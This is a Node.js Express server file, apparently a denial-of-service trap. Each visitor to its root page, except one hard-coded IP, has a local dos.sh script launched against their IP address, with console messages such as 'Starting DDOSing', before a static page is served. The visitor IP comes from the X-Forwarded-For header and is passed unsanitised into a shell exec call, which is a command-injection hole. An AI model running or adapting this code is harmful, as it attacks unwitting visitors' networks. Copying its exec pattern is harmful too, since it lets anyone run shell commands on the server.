const express = require("express");
const app = express();
const { exec } = require("child_process");

app.get("/", (req, res) => {

    let date = new Date();

    let ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    ip = ip.replace("::ffff:", "");

    if (ip != "91.113.91.133") {
        console.log("Starting DDOSing");
        console.log(date.toString() + "  " + ip);

        exec(__dirname + "/dos.sh " + ip, (error, stdout, stderr) => {
            if (error) {
                console.log(`error: ${error.message}`);
                return;
            }
            if (stderr) {
                console.log(`stderr: ${stderr}`);
                return;
            }
        });

        console.log("Script started");
    }

    res.sendFile(__dirname + "/static/index.html");
});


app.listen(80, () => {
    console.log("DDOS Server started");
});